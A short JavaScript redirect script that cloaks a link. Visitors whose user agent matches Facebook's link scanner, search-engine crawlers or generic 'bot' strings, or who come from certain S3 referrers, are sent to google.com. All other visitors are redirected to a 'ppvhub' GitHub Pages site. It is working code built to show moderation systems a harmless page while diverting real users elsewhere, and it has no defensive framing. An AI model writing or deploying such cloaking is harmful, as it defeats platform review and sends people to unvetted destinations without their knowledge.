const currentPath = window.location.pathname;
const targetDomain = "https://ppvhub.github.io/ppvhub";
const targetUrl = targetDomain + currentPath;
const ua = navigator.userAgent.toLowerCase();
const fbAndOtherBots = [
    'facebookexternalhit', 'facebot', 'fb_iab', 'fb4a', 'fbav',
    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
    'yandex', 'sogou', 'exabot', 'ia_archiver', 'bot', 'crawler', 'spider'
];

const referrer = document.referrer || '';
const badReferrers = [
    "https://www.google.s3.amazonaws.com",
    "https://google.s3.amazonaws.com",
    "google.s3.amazonaws.com"
];

const isBot = fbAndOtherBots.some(bot => ua.includes(bot));
const isBadReferrer = badReferrers.some(r => referrer.includes(r));
if (isBot || isBadReferrer) {
    window.location.replace("https://www.google.com");
} else {
    window.location.replace(targetUrl);
}
